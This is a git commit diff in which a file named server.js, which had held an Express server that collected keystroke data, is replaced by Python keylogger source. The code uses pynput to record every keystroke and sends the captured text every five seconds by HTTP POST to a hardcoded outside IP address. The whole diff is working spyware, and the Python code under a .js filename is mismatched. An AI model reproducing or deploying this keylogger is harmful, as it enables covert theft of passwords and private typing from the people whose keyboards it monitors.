513ad06377412b367c8c97aeb04fc2fce6a09888
Satyam Pundir <98890120+SatyamPundir@users.noreply.github.com>
2024-04-16 21:45:21 +0530

    Update server.js
    new

--- server.js
+++ server.js
@@ -1,43 +1,67 @@
-// We import the fs module so that we can have access to the file system.
-const fs = require("fs");
-const express = require("express");
-const bodyParser = require("body-parser");
+# Install pynput using the following command: pip install pynput
+# Import the mouse and keynboard from pynput
+from pynput import keyboard
+# We need to import the requests library to Post the data to the server.
+import requests
+# To transform a Dictionary to a JSON string we need the json package.
+import json
+#  The Timer module is part of the threading package.
+import threading
+# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
+text = ""
 
-// Create the express app.
-const app = express();
+# Hard code the values of your server and ip address here.
+ip_address = "54.164.181.20"
+port_number = "8080"
+# Time interval in seconds for code to execute.
+time_interval = 5
 
-/* app should use bodyParser. For this example we'll use json. bodyParser allows you to
-access the body of your request.
-*/
-app.use(bodyParser.json({extended: true}));
+def send_post_req():
+    try:
+        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
+        # the format {"keyboardData" : "<value_of_text>"}
+        payload = json.dumps({"keyboardData" : text})
+        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
+        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
+        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
+        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
+        timer = threading.Timer(time_interval, send_post_req)
+        # We start the timer thread.
+        timer.start()
+    except:
+        print("Couldn't complete request!")
 
-// We assign the port number 8080.
-const port = 8080;
+# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
+def on_press(key):
+    global text
 
-// When a GET request is made to the "/" resource we return basic HTML.
-app.get("/", (req, res) => {
-    /* The GET request shows the data that's logged in the keyboard_capture.txt file.
-    If the file keyboard_capture.txt has not yet been created, the try catch statement will
-    throw an exception and log to the homepage that nothing's been logged yet.   
-    */ 
-    try {
-        const kl_file = fs.readFileSync("./keyboard_capture.txt", {encoding:'utf8', flag:'r'});    
-        // We send the txt file data to the server. We replace the "\n" with <br> 
-        res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
-    } catch {
-        res.send("<h1>Nothing logged yet.</h1>");
-    }  
-});
+# Based on the key press we handle the way the key gets logged to the in memory string.
+# Read more on the different keys that can be logged here:
+# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text += "\t"
+    elif key == keyboard.Key.space:
+        text += " "
+    elif key == keyboard.Key.shift:
+        pass
+    elif key == keyboard.Key.backspace and len(text) == 0:
+        pass
+    elif key == keyboard.Key.backspace and len(text) > 0:
+        text = text[:-1]
+    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
+        text += str(key).strip("'")
 
-
-app.post("/", (req, res) => {
-    // For demo purposes we log the keyboardData sent as part of the body of the POST request to the server.
-    console.log(req.body.keyboardData);
-    // Will now write the keyboard capture to a text file.
-    fs.writeFileSync("keyboard_capture.txt", req.body.keyboardData);
-    res.send("Successfully set the data");
-});
-// We can see that the app is listening on which port.
-app.listen(port, () => {
-    console.log(`App is listening on port ${port}`);
-});
+# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
+# In the on_press function we specified how to deal with the different inputs received by the listener.
+with keyboard.Listener(
+    on_press=on_press) as listener:
+    # We start of by sending the post request to our server.
+    send_post_req()
+    listener.join()
